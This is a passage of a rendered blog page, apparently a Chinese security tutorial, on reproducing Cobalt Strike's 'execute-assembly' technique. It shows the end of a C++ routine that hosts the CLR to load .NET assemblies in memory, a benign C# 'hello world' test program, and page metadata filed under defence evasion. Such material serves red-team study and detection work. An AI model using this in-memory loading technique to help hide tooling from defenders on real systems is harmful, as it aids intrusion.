		<span class="token keyword">long</span> idx<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
		<span class="token function">SafeArrayPutElement</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>vPsa<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	HRESULT hr <span class="token operator">=</span> pMethodInfo<span class="token operator">-&gt;</span><span class="token function">Invoke_3</span><span class="token punctuation">(</span>vObj<span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token operator">&amp;</span>vRet<span class="token punctuation">)</span><span class="token punctuation">;</span>
	pMethodInfo<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pAssembly<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	pDefaultAppDomain<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	iRuntimeInfo<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	iMetaHost<span class="token operator">-&gt;</span><span class="token function">Release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">CoUninitialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>执行的C#源码</p><div class="language-csharp line-numbers-mode" data-ext="cs" data-title="cs"><pre class="language-csharp"><code><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span>

<span class="token keyword">namespace</span> <span class="token namespace">TEST</span>
<span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name">Program</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">static</span> <span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token class-name">String<span class="token punctuation">[</span><span class="token punctuation">]</span></span> args<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">&quot;hello world!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">var</span></span> s <span class="token keyword">in</span> args<span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13))])}const x=o(v,[["render",R],["__file","ExecuteAssembly.html.vue"]]),B=JSON.parse(`{"path":"/CyberSecurity/DefenseEvasion/ExecuteAssembly.html","title":"Execute-Assembly实现方法","lang":"zh-CN","frontmatter":{},"headers":[{"level":2,"title":"0. 执行本地文件","slug":"_0-执行本地文件","link":"#_0-执行本地文件","children":[{"level":3,"title":"exe","slug":"exe","link":"#exe","children":[]},{"level":3,"title":"dll","slug":"dll","link":"#dll","children":[]}]},{"level":2,"title":"1. managed代码内存加载.NET程序集","slug":"_1-managed代码内存加载-net程序集","link":"#_1-managed代码内存加载-net程序集","children":[{"level":3,"title":"1.1. 三种Load的区别","slug":"_1-1-三种load的区别","link":"#_1-1-三种load的区别","children":[]},{"level":3,"title":"1.2. C#反射加载流程","slug":"_1-2-c-反射加载流程","link":"#_1-2-c-反射加载流程","children":[]},{"level":3,"title":"1.3. powershell","slug":"_1-3-powershell","link":"#_1-3-powershell","children":[]}]},{"level":2,"title":"2. unmanaged代码内存加载.NET程序集","slug":"_2-unmanaged代码内存加载-net程序集","link":"#_2-unmanaged代码内存加载-net程序集","children":[{"level":3,"title":"2.1. CLR","slug":"_2-1-clr","link":"#_2-1-clr","children":[]},{"level":3,"title":"2.2. Cobalt Strike execute-assembly流程","slug":"_2-2-cobalt-strike-execute-assembly流程","link":"#_2-2-cobalt-strike-execute-assembly流程","children":[]},{"level":3,"title":"2.3. 硬盘加载执行.NET程序集","slug":"_2-3-硬盘加载执行-net程序集","link":"#_2-3-硬盘加载执行-net程序集","children":[]},{"level":3,"title":"2.4. 内存加载执行.NET程序集","slug":"_2-4-内存加载执行-net程序集","link":"#_2-4-内存加载执行-net程序集","children":[]}]}],"git":{"createdTime":1733813438000,"updatedTime":1733813438000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":1}]},"readingTime":{"minutes":11.29,"words":3386},"filePathRelative":"CyberSecurity/DefenseEvasion/ExecuteAssembly.md","localizedDate":"2024年12月10日","excerpt":"\\n<p>文档里的代码都<a href=\\"https://github.com/echo0d/DailyCode/tree/main/ExecuteAssembly\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">DailyCode/PEExecute at main · echo0d/DailyCode</a></p>\\n<blockquote>\\n<ul>\\n<li>执行本地exe</li>\\n<li>从内存中加载.NET程序集\\n<ul>\\n<li>C#</li>\\n<li>C++</li>\\n</ul>\\n</li>\\n</ul>\\n<p><a href=\\"https://idiotc4t.com/defense-evasion/cobaltstrike-executeassembly-realization\\" target=\\"_blank\\" rel=\\"noopener noreferrer\\">Execute-Assembly实现 | idiotc4t's blog</a></p>\\n</blockquote>"}`);export{x as comp,B as data};
